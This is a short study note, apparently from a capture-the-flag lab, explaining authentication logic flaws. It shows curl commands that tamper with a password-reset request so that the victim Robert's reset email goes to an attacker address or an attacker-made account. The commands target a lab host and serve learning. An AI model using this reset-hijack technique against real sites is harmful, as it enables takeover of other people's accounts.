___
- tags: #authentication_bypass 
___
## What is a Logic Flaw?
Sometimes authentication processes contain logic flaws.
A logic flaw is a typical path of an application is either bypassed, circumvented or manipulated by a hacker.
Logic flaws can exist in any area of a website, but we're going to concetrate on examples relating to authentication in this instance.
![[Pasted image 20250829020709.png]]


## Attempt to change password (example)
```bash
curl 'http://10.201.78.121/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
### Arguments
- -H -> add an additional header to the request.
	- 'Content-Type' to 'application/x-www-form-urlencoded', which lets the web server know we are sending form data so it properly understands our request.

### Change email
```bash
curl 'http://10.201.78.121/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

### Using acmeitsupport.thm account

```bash
curl 'http://10.201.78.121/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=**{username}**@customer.acmeitsupport.thm'
```
